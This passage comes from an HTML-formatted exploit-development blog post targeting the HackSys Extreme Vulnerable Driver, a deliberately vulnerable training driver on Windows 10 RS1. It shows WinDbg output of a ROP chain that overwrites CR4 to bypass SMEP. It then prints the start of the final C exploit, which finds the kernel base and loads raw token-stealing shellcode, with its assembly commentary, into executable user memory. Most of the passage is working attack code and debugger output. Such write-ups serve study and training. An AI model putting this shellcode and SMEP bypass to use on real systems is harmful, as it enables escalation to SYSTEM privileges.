+<a id="__codelineno-10-32" name="__codelineno-10-32"></a><span class="nf">r14</span><span class="err">=</span><span class="mi">4141414141414141</span><span class="w"> </span><span class="no">r15</span><span class="err">=</span><span class="mi">4141414141414141</span><span class="w"></span>
+<a id="__codelineno-10-33" name="__codelineno-10-33"></a><span class="nf">iopl</span><span class="err">=</span><span class="mi">0</span><span class="w">         </span><span class="no">nv</span><span class="w"> </span><span class="no">up</span><span class="w"> </span><span class="no">ei</span><span class="w"> </span><span class="no">pl</span><span class="w"> </span><span class="no">zr</span><span class="w"> </span><span class="no">na</span><span class="w"> </span><span class="no">po</span><span class="w"> </span><span class="no">nc</span><span class="w"></span>
+<a id="__codelineno-10-34" name="__codelineno-10-34"></a><span class="nf">cs</span><span class="err">=</span><span class="mi">0010</span><span class="w">  </span><span class="no">ss</span><span class="err">=</span><span class="mi">0018</span><span class="w">  </span><span class="no">ds</span><span class="err">=</span><span class="mi">002</span><span class="no">b</span><span class="w">  </span><span class="no">es</span><span class="err">=</span><span class="mi">002</span><span class="no">b</span><span class="w">  </span><span class="no">fs</span><span class="err">=</span><span class="mi">0053</span><span class="w">  </span><span class="no">gs</span><span class="err">=</span><span class="mi">002</span><span class="no">b</span><span class="w">             </span><span class="no">efl</span><span class="err">=</span><span class="mi">00000246</span><span class="w"></span>
+<a id="__codelineno-10-35" name="__codelineno-10-35"></a>
+<a id="__codelineno-10-36" name="__codelineno-10-36"></a><span class="nf">nt</span><span class="p">!</span><span class="no">HvCheckBin</span><span class="err">+</span><span class="mi">0xe2</span><span class="p">:</span><span class="w"></span>
+<a id="__codelineno-10-37" name="__codelineno-10-37"></a><span class="nf">fffff805</span><span class="err">`</span><span class="mi">820</span><span class="no">a0a52</span><span class="w"> </span><span class="no">c3</span><span class="w">              </span><span class="no">ret</span><span class="w"></span>
+<a id="__codelineno-10-38" name="__codelineno-10-38"></a>
+<a id="__codelineno-10-39" name="__codelineno-10-39"></a><span class="err">1:</span><span class="w"> </span><span class="nf">kd</span><span class="err">&gt;</span><span class="w"> </span><span class="no">p</span><span class="w"></span>
+<a id="__codelineno-10-40" name="__codelineno-10-40"></a><span class="nf">nt</span><span class="p">!</span><span class="no">KiEnableXSave</span><span class="err">+</span><span class="mi">0xb53f</span><span class="p">:</span><span class="w"></span>
+<a id="__codelineno-10-41" name="__codelineno-10-41"></a><span class="nf">fffff805</span><span class="err">`</span><span class="mi">823</span><span class="no">a41e3</span><span class="w"> </span><span class="mi">0</span><span class="no">f22e1</span><span class="w">          </span><span class="no">mov</span><span class="w">     </span><span class="no">tmm</span><span class="p">,</span><span class="no">rcx</span><span class="w"></span>
+<a id="__codelineno-10-42" name="__codelineno-10-42"></a>
+<a id="__codelineno-10-43" name="__codelineno-10-43"></a><span class="err">1:</span><span class="w"> </span><span class="nf">kd</span><span class="err">&gt;</span><span class="w"> </span><span class="no">p</span><span class="w"></span>
+<a id="__codelineno-10-44" name="__codelineno-10-44"></a><span class="nf">nt</span><span class="p">!</span><span class="no">KiEnableXSave</span><span class="err">+</span><span class="mi">0xb542</span><span class="p">:</span><span class="w"></span>
+<a id="__codelineno-10-45" name="__codelineno-10-45"></a><span class="nf">fffff805</span><span class="err">`</span><span class="mi">823</span><span class="no">a41e6</span><span class="w"> </span><span class="no">c3</span><span class="w">              </span><span class="no">ret</span><span class="w"></span>
+<a id="__codelineno-10-46" name="__codelineno-10-46"></a>
+<a id="__codelineno-10-47" name="__codelineno-10-47"></a><span class="err">1:</span><span class="w"> </span><span class="nf">kd</span><span class="err">&gt;</span><span class="w"> </span><span class="no">r</span><span class="w"> </span><span class="no">cr4</span><span class="w"></span>
+<a id="__codelineno-10-48" name="__codelineno-10-48"></a><span class="nf">cr4</span><span class="err">=</span><span class="mi">0000000000070678</span><span class="w"></span>
+</code></pre></div></td></tr></table></div>
+<ol>
+<li>Pay attention to the value in RCX here.</li>
+<li>This denotes excluded instructions. It isn't important.</li>
+</ol>
+<p>As you can see in the above output from WinDbg we <strong>set a breakpoint on the memcpy</strong> then we step through the program until the return, at the return we can clearly see that our <code>pop rcx</code> gadget is executed and then the value <code>70678</code> is placed in the RCX register. If we continue stepping we then see that value being written into the CR4 register thus allowing us to bypass <abbr title="Supervisor Mode Execution Prevention">SMEP</abbr>. All that's left for us to do now is to allocate some space in user land, fill it with shellcode and get a system shell.</p>
+<p>I'll leave this part for you to do based on whatever build of Windows you're on. I'm on <abbr title="Redstone 1">RS1</abbr> in this post so I used a well known shellcode (got it from <a href="https://github.com/connormcgarr/Kernel-Exploits/blob/master/HEVD/Stack%20Overflow/Windows10_StackOverflow.c">here</a> thanks Conor <img alt="😄" class="twemoji" src="https://twemoji.maxcdn.com/v/latest/svg/1f604.svg" title=":smile:" />) which loops over processes and does a comparison between the current PID vs the SYSTEM PID until the SYSTEM PID is found. </p>
+<hr>
+
+<h1 id="final-exploit">Final Exploit<a class="headerlink" href="#final-exploit" title="Permanent link">&para;</a></h1>
+<p>You can find my full exploit below. Or scroll down to open it on GitHub. Thanks for reading!</p>
+<div class="highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Final Exploit</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">  1</a></span>
+<span class="normal"><a href="#__codelineno-11-2">  2</a></span>
+<span class="normal"><a href="#__codelineno-11-3">  3</a></span>
+<span class="normal"><a href="#__codelineno-11-4">  4</a></span>
+<span class="normal"><a href="#__codelineno-11-5">  5</a></span>
+<span class="normal"><a href="#__codelineno-11-6">  6</a></span>
+<span class="normal"><a href="#__codelineno-11-7">  7</a></span>
+<span class="normal"><a href="#__codelineno-11-8">  8</a></span>
+<span class="normal"><a href="#__codelineno-11-9">  9</a></span>
+<span class="normal"><a href="#__codelineno-11-10"> 10</a></span>
+<span class="normal"><a href="#__codelineno-11-11"> 11</a></span>
+<span class="normal"><a href="#__codelineno-11-12"> 12</a></span>
+<span class="normal"><a href="#__codelineno-11-13"> 13</a></span>
+<span class="normal"><a href="#__codelineno-11-14"> 14</a></span>
+<span class="normal"><a href="#__codelineno-11-15"> 15</a></span>
+<span class="normal"><a href="#__codelineno-11-16"> 16</a></span>
+<span class="normal"><a href="#__codelineno-11-17"> 17</a></span>
+<span class="normal"><a href="#__codelineno-11-18"> 18</a></span>
+<span class="normal"><a href="#__codelineno-11-19"> 19</a></span>
+<span class="normal"><a href="#__codelineno-11-20"> 20</a></span>
+<span class="normal"><a href="#__codelineno-11-21"> 21</a></span>
+<span class="normal"><a href="#__codelineno-11-22"> 22</a></span>
+<span class="normal"><a href="#__codelineno-11-23"> 23</a></span>
+<span class="normal"><a href="#__codelineno-11-24"> 24</a></span>
+<span class="normal"><a href="#__codelineno-11-25"> 25</a></span>
+<span class="normal"><a href="#__codelineno-11-26"> 26</a></span>
+<span class="normal"><a href="#__codelineno-11-27"> 27</a></span>
+<span class="normal"><a href="#__codelineno-11-28"> 28</a></span>
+<span class="normal"><a href="#__codelineno-11-29"> 29</a></span>
+<span class="normal"><a href="#__codelineno-11-30"> 30</a></span>
+<span class="normal"><a href="#__codelineno-11-31"> 31</a></span>
+<span class="normal"><a href="#__codelineno-11-32"> 32</a></span>
+<span class="normal"><a href="#__codelineno-11-33"> 33</a></span>
+<span class="normal"><a href="#__codelineno-11-34"> 34</a></span>
+<span class="normal"><a href="#__codelineno-11-35"> 35</a></span>
+<span class="normal"><a href="#__codelineno-11-36"> 36</a></span>
+<span class="normal"><a href="#__codelineno-11-37"> 37</a></span>
+<span class="normal"><a href="#__codelineno-11-38"> 38</a></span>
+<span class="normal"><a href="#__codelineno-11-39"> 39</a></span>
+<span class="normal"><a href="#__codelineno-11-40"> 40</a></span>
+<span class="normal"><a href="#__codelineno-11-41"> 41</a></span>
+<span class="normal"><a href="#__codelineno-11-42"> 42</a></span>
+<span class="normal"><a href="#__codelineno-11-43"> 43</a></span>
+<span class="normal"><a href="#__codelineno-11-44"> 44</a></span>
+<span class="normal"><a href="#__codelineno-11-45"> 45</a></span>
+<span class="normal"><a href="#__codelineno-11-46"> 46</a></span>
+<span class="normal"><a href="#__codelineno-11-47"> 47</a></span>
+<span class="normal"><a href="#__codelineno-11-48"> 48</a></span>
+<span class="normal"><a href="#__codelineno-11-49"> 49</a></span>
+<span class="normal"><a href="#__codelineno-11-50"> 50</a></span>
+<span class="normal"><a href="#__codelineno-11-51"> 51</a></span>
+<span class="normal"><a href="#__codelineno-11-52"> 52</a></span>
+<span class="normal"><a href="#__codelineno-11-53"> 53</a></span>
+<span class="normal"><a href="#__codelineno-11-54"> 54</a></span>
+<span class="normal"><a href="#__codelineno-11-55"> 55</a></span>
+<span class="normal"><a href="#__codelineno-11-56"> 56</a></span>
+<span class="normal"><a href="#__codelineno-11-57"> 57</a></span>
+<span class="normal"><a href="#__codelineno-11-58"> 58</a></span>
+<span class="normal"><a href="#__codelineno-11-59"> 59</a></span>
+<span class="normal"><a href="#__codelineno-11-60"> 60</a></span>
+<span class="normal"><a href="#__codelineno-11-61"> 61</a></span>
+<span class="normal"><a href="#__codelineno-11-62"> 62</a></span>
+<span class="normal"><a href="#__codelineno-11-63"> 63</a></span>
+<span class="normal"><a href="#__codelineno-11-64"> 64</a></span>
+<span class="normal"><a href="#__codelineno-11-65"> 65</a></span>
+<span class="normal"><a href="#__codelineno-11-66"> 66</a></span>
+<span class="normal"><a href="#__codelineno-11-67"> 67</a></span>
+<span class="normal"><a href="#__codelineno-11-68"> 68</a></span>
+<span class="normal"><a href="#__codelineno-11-69"> 69</a></span>
+<span class="normal"><a href="#__codelineno-11-70"> 70</a></span>
+<span class="normal"><a href="#__codelineno-11-71"> 71</a></span>
+<span class="normal"><a href="#__codelineno-11-72"> 72</a></span>
+<span class="normal"><a href="#__codelineno-11-73"> 73</a></span>
+<span class="normal"><a href="#__codelineno-11-74"> 74</a></span>
+<span class="normal"><a href="#__codelineno-11-75"> 75</a></span>
+<span class="normal"><a href="#__codelineno-11-76"> 76</a></span>
+<span class="normal"><a href="#__codelineno-11-77"> 77</a></span>
+<span class="normal"><a href="#__codelineno-11-78"> 78</a></span>
+<span class="normal"><a href="#__codelineno-11-79"> 79</a></span>
+<span class="normal"><a href="#__codelineno-11-80"> 80</a></span>
+<span class="normal"><a href="#__codelineno-11-81"> 81</a></span>
+<span class="normal"><a href="#__codelineno-11-82"> 82</a></span>
+<span class="normal"><a href="#__codelineno-11-83"> 83</a></span>
+<span class="normal"><a href="#__codelineno-11-84"> 84</a></span>
+<span class="normal"><a href="#__codelineno-11-85"> 85</a></span>
+<span class="normal"><a href="#__codelineno-11-86"> 86</a></span>
+<span class="normal"><a href="#__codelineno-11-87"> 87</a></span>
+<span class="normal"><a href="#__codelineno-11-88"> 88</a></span>
+<span class="normal"><a href="#__codelineno-11-89"> 89</a></span>
+<span class="normal"><a href="#__codelineno-11-90"> 90</a></span>
+<span class="normal"><a href="#__codelineno-11-91"> 91</a></span>
+<span class="normal"><a href="#__codelineno-11-92"> 92</a></span>
+<span class="normal"><a href="#__codelineno-11-93"> 93</a></span>
+<span class="normal"><a href="#__codelineno-11-94"> 94</a></span>
+<span class="normal"><a href="#__codelineno-11-95"> 95</a></span>
+<span class="normal"><a href="#__codelineno-11-96"> 96</a></span>
+<span class="normal"><a href="#__codelineno-11-97"> 97</a></span>
+<span class="normal"><a href="#__codelineno-11-98"> 98</a></span>
+<span class="normal"><a href="#__codelineno-11-99"> 99</a></span>
+<span class="normal"><a href="#__codelineno-11-100">100</a></span>
+<span class="normal"><a href="#__codelineno-11-101">101</a></span>
+<span class="normal"><a href="#__codelineno-11-102">102</a></span>
+<span class="normal"><a href="#__codelineno-11-103">103</a></span>
+<span class="normal"><a href="#__codelineno-11-104">104</a></span>
+<span class="normal"><a href="#__codelineno-11-105">105</a></span>
+<span class="normal"><a href="#__codelineno-11-106">106</a></span>
+<span class="normal"><a href="#__codelineno-11-107">107</a></span>
+<span class="normal"><a href="#__codelineno-11-108">108</a></span>
+<span class="normal"><a href="#__codelineno-11-109">109</a></span>
+<span class="normal"><a href="#__codelineno-11-110">110</a></span>
+<span class="normal"><a href="#__codelineno-11-111">111</a></span>
+<span class="normal"><a href="#__codelineno-11-112">112</a></span>
+<span class="normal"><a href="#__codelineno-11-113">113</a></span>
+<span class="normal"><a href="#__codelineno-11-114">114</a></span>
+<span class="normal"><a href="#__codelineno-11-115">115</a></span>
+<span class="normal"><a href="#__codelineno-11-116">116</a></span>
+<span class="normal"><a href="#__codelineno-11-117">117</a></span>
+<span class="normal"><a href="#__codelineno-11-118">118</a></span>
+<span class="normal"><a href="#__codelineno-11-119">119</a></span>
+<span class="normal"><a href="#__codelineno-11-120">120</a></span>
+<span class="normal"><a href="#__codelineno-11-121">121</a></span>
+<span class="normal"><a href="#__codelineno-11-122">122</a></span>
+<span class="normal"><a href="#__codelineno-11-123">123</a></span>
+<span class="normal"><a href="#__codelineno-11-124">124</a></span>
+<span class="normal"><a href="#__codelineno-11-125">125</a></span>
+<span class="normal"><a href="#__codelineno-11-126">126</a></span>
+<span class="normal"><a href="#__codelineno-11-127">127</a></span>
+<span class="normal"><a href="#__codelineno-11-128">128</a></span>
+<span class="normal"><a href="#__codelineno-11-129">129</a></span>
+<span class="normal"><a href="#__codelineno-11-130">130</a></span>
+<span class="normal"><a href="#__codelineno-11-131">131</a></span>
+<span class="normal"><a href="#__codelineno-11-132">132</a></span>
+<span class="normal"><a href="#__codelineno-11-133">133</a></span>
+<span class="normal"><a href="#__codelineno-11-134">134</a></span>
+<span class="normal"><a href="#__codelineno-11-135">135</a></span>
+<span class="normal"><a href="#__codelineno-11-136">136</a></span>
+<span class="normal"><a href="#__codelineno-11-137">137</a></span>
+<span class="normal"><a href="#__codelineno-11-138">138</a></span>
+<span class="normal"><a href="#__codelineno-11-139">139</a></span>
+<span class="normal"><a href="#__codelineno-11-140">140</a></span>
+<span class="normal"><a href="#__codelineno-11-141">141</a></span>
+<span class="normal"><a href="#__codelineno-11-142">142</a></span>
+<span class="normal"><a href="#__codelineno-11-143">143</a></span>
+<span class="normal"><a href="#__codelineno-11-144">144</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
+<a id="__codelineno-11-2" name="__codelineno-11-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<a id="__codelineno-11-3" name="__codelineno-11-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;Psapi.h&gt;</span><span class="cp"></span>
+<a id="__codelineno-11-4" name="__codelineno-11-4"></a>
+<a id="__codelineno-11-5" name="__codelineno-11-5"></a><span class="cp">#define DRIVER &quot;\\\\.\\HacksysExtremeVulnerableDriver&quot;</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6"></a><span class="cp">#define IOCTL_CODE 0x222003</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7"></a>
+<a id="__codelineno-11-8" name="__codelineno-11-8"></a><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="nf">GetKernelBase</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-11-9" name="__codelineno-11-9"></a><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-11-10" name="__codelineno-11-10"></a>
+<a id="__codelineno-11-11" name="__codelineno-11-11"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w">  </span><span class="n">lpImageBase</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span><span class="w"></span>
+<a id="__codelineno-11-12" name="__codelineno-11-12"></a><span class="w">    </span><span class="n">DWORD</span><span class="w">   </span><span class="n">lpcbNeeded</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-11-13" name="__codelineno-11-13"></a>
+<a id="__codelineno-11-14" name="__codelineno-11-14"></a><span class="w">    </span><span class="cm">/* Get base address of first driver (ntoskrnl.exe) */</span><span class="w"></span>
+<a id="__codelineno-11-15" name="__codelineno-11-15"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Obtaining Driver Base Address!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-16" name="__codelineno-11-16"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">DriversBase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">EnumDeviceDrivers</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">),</span><span class="w"> </span><span class="o">&amp;</span><span class="n">lpcbNeeded</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-17" name="__codelineno-11-17"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DriversBase</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-11-18" name="__codelineno-11-18"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-11-19" name="__codelineno-11-19"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Error enumerating device drivers!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-20" name="__codelineno-11-20"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-21" name="__codelineno-11-21"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-11-22" name="__codelineno-11-22"></a>
+<a id="__codelineno-11-23" name="__codelineno-11-23"></a><span class="w">    </span><span class="cm">/* Get name of first driver (ntoskrnl.exe) */</span><span class="w"></span>
+<a id="__codelineno-11-24" name="__codelineno-11-24"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">BaseName</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span><span class="w"></span>
+<a id="__codelineno-11-25" name="__codelineno-11-25"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">DriversBaseName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">GetDeviceDriverBaseNameA</span><span class="p">(</span><span class="n">lpImageBase</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="w"> </span><span class="n">BaseName</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">BaseName</span><span class="p">));</span><span class="w"></span>
+<a id="__codelineno-11-26" name="__codelineno-11-26"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DriversBaseName</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-11-27" name="__codelineno-11-27"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-11-28" name="__codelineno-11-28"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] FATAL: Error getting drivers base name!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-29" name="__codelineno-11-29"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-30" name="__codelineno-11-30"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-11-31" name="__codelineno-11-31"></a>
+<a id="__codelineno-11-32" name="__codelineno-11-32"></a><span class="w">    </span><span class="cm">/* </span>
+<a id="__codelineno-11-33" name="__codelineno-11-33"></a><span class="cm">     * ntoskrnl.exe is the first module in lpImageBase.</span>
+<a id="__codelineno-11-34" name="__codelineno-11-34"></a><span class="cm">     * typecast LPVOID -&gt; unsigned long long</span>
+<a id="__codelineno-11-35" name="__codelineno-11-35"></a><span class="cm">    */</span><span class="w"></span>
+<a id="__codelineno-11-36" name="__codelineno-11-36"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="n">KernelBase</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="n">lpImageBase</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span><span class="w"></span>
+<a id="__codelineno-11-37" name="__codelineno-11-37"></a>
+<a id="__codelineno-11-38" name="__codelineno-11-38"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] Driver base name is: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BaseName</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-39" name="__codelineno-11-39"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] %s is located at: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">BaseName</span><span class="p">,</span><span class="w"> </span><span class="n">KernelBase</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-40" name="__codelineno-11-40"></a>
+<a id="__codelineno-11-41" name="__codelineno-11-41"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">KernelBase</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-11-42" name="__codelineno-11-42"></a>
+<a id="__codelineno-11-43" name="__codelineno-11-43"></a><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-11-44" name="__codelineno-11-44"></a>
+<a id="__codelineno-11-45" name="__codelineno-11-45"></a><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="kt">long</span><span class="w"> </span><span class="nf">CreateShellcode</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-11-46" name="__codelineno-11-46"></a><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-11-47" name="__codelineno-11-47"></a><span class="w">    </span><span class="cm">/*</span>
+<a id="__codelineno-11-48" name="__codelineno-11-48"></a><span class="cm">        _start:</span>
+<a id="__codelineno-11-49" name="__codelineno-11-49"></a><span class="cm">            mov rax, [gs:0x188]         ; Current thread (_KTHREAD)</span>
+<a id="__codelineno-11-50" name="__codelineno-11-50"></a><span class="cm">            mov rax, [rax + 0xb8]       ; Current process (_EPROCESS)</span>
+<a id="__codelineno-11-51" name="__codelineno-11-51"></a><span class="cm">            mov rbx, rax                ; Copy current process (_EPROCESS) to rbx</span>
+<a id="__codelineno-11-52" name="__codelineno-11-52"></a><span class="cm">        __loop:</span>
+<a id="__codelineno-11-53" name="__codelineno-11-53"></a><span class="cm">            mov rbx, [rbx + 0x2f0]      ; ActiveProcessLinks</span>
+<a id="__codelineno-11-54" name="__codelineno-11-54"></a><span class="cm">            sub rbx, 0x2f0              ; Go back to current process (_EPROCESS)</span>
+<a id="__codelineno-11-55" name="__codelineno-11-55"></a><span class="cm">            mov rcx, [rbx + 0x2e8]      ; UniqueProcessId (PID)</span>
+<a id="__codelineno-11-56" name="__codelineno-11-56"></a><span class="cm">            cmp rcx, 4                  ; Compare PID to SYSTEM PID </span>
+<a id="__codelineno-11-57" name="__codelineno-11-57"></a><span class="cm">            jnz __loop                  ; Loop until SYSTEM PID is found</span>
+<a id="__codelineno-11-58" name="__codelineno-11-58"></a><span class="cm">            mov rcx, [rbx + 0x358]      ; SYSTEM token is @ offset _EPROCESS + 0x358</span>
+<a id="__codelineno-11-59" name="__codelineno-11-59"></a><span class="cm">            and cl, 0xf0                ; Clear out _EX_FAST_REF RefCnt</span>
+<a id="__codelineno-11-60" name="__codelineno-11-60"></a><span class="cm">            mov [rax + 0x358], rcx      ; Copy SYSTEM token to current process</span>
+<a id="__codelineno-11-61" name="__codelineno-11-61"></a><span class="cm">            add rsp, 0x40               ; Restore execution</span>
+<a id="__codelineno-11-62" name="__codelineno-11-62"></a><span class="cm">            ret </span>
+<a id="__codelineno-11-63" name="__codelineno-11-63"></a><span class="cm">    */</span><span class="w"></span>
+<a id="__codelineno-11-64" name="__codelineno-11-64"></a>
+<a id="__codelineno-11-65" name="__codelineno-11-65"></a><span class="w">    </span><span class="c1">// Windows 10 RS1 offsets in _EPROCESS structure</span>
+<a id="__codelineno-11-66" name="__codelineno-11-66"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">payload</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;</span><span class="se">\x65\x48\x8B\x04\x25\x88\x01\x00\x00\x48\x8B\x80</span><span class="s">&quot;</span><span class="w"></span>
+<a id="__codelineno-11-67" name="__codelineno-11-67"></a><span class="w">                     </span><span class="s">&quot;</span><span class="se">\xB8\x00\x00\x00\x48\x89\xC3\x48\x8B\x9B\xF0</span><span class="s">&quot;</span><span class="w"></span>
+<a id="__codelineno-11-68" name="__codelineno-11-68"></a><span class="w">                     </span><span class="s">&quot;</span><span class="se">\x02\x00\x00\x48\x81\xEB\xF0\x02\x00\x00\x48</span><span class="s">&quot;</span><span class="w"></span>
+<a id="__codelineno-11-69" name="__codelineno-11-69"></a><span class="w">                     </span><span class="s">&quot;</span><span class="se">\x8B\x8B\xE8\x02\x00\x00\x48\x83\xF9\x04</span><span class="s">&quot;</span><span class="w"></span>
+<a id="__codelineno-11-70" name="__codelineno-11-70"></a><span class="w">                     </span><span class="s">&quot;</span><span class="se">\x75\xE5\x48\x8B\x8B\x58\x03\x00\x00\x80</span><span class="s">&quot;</span><span class="w"></span>
+<a id="__codelineno-11-71" name="__codelineno-11-71"></a><span class="w">                     </span><span class="s">&quot;</span><span class="se">\xE1\xF0\x48\x89\x88\x58\x03\x00\x00\x48</span><span class="s">&quot;</span><span class="w"></span>
+<a id="__codelineno-11-72" name="__codelineno-11-72"></a><span class="w">                     </span><span class="s">&quot;</span><span class="se">\x83\xC4\x40\xC3</span><span class="s">&quot;</span><span class="p">;</span><span class="w"></span>
+<a id="__codelineno-11-73" name="__codelineno-11-73"></a>
+<a id="__codelineno-11-74" name="__codelineno-11-74"></a><span class="w">    </span><span class="cm">/* Allocate shellcode in user mode */</span><span class="w"></span>
+<a id="__codelineno-11-75" name="__codelineno-11-75"></a><span class="w">    </span><span class="n">LPVOID</span><span class="w"> </span><span class="n">shellcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span><span class="w"> </span><span class="mh">0x3000</span><span class="p">,</span><span class="w"> </span><span class="mh">0x40</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-76" name="__codelineno-11-76"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">shellcode</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-11-77" name="__codelineno-11-77"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-11-78" name="__codelineno-11-78"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] FATAL: Unable to allocate shellcode!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-79" name="__codelineno-11-79"></a><span class="w">        </span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-80" name="__codelineno-11-80"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-11-81" name="__codelineno-11-81"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] Shellcode allocated at: 0x%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">shellcode</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-82" name="__codelineno-11-82"></a>
+<a id="__codelineno-11-83" name="__codelineno-11-83"></a><span class="w">    </span><span class="cm">/* Move allocated space in user mode */</span><span class="w"></span>
+<a id="__codelineno-11-84" name="__codelineno-11-84"></a><span class="w">    </span><span class="n">BOOL</span><span class="w"> </span><span class="n">MoveMem</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RtlMoveMemory</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span><span class="w"> </span><span class="n">payload</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span><span class="w"></span>
+<a id="__codelineno-11-85" name="__codelineno-11-85"></a><span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">MoveMem</span><span class="p">)</span><span class="w"></span>
+<a id="__codelineno-11-86" name="__codelineno-11-86"></a><span class="w">    </span><span class="p">{</span><span class="w"></span>
+<a id="__codelineno-11-87" name="__codelineno-11-87"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[-] FATAL: Unable to move shellcode into allocated memory!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<a id="__codelineno-11-88" name="__codelineno-11-88"></a><span class="w">    </span><span class="p">}</span><span class="w"></span>
+<a id="__codelineno-11-89" name="__codelineno-11-89"></a>
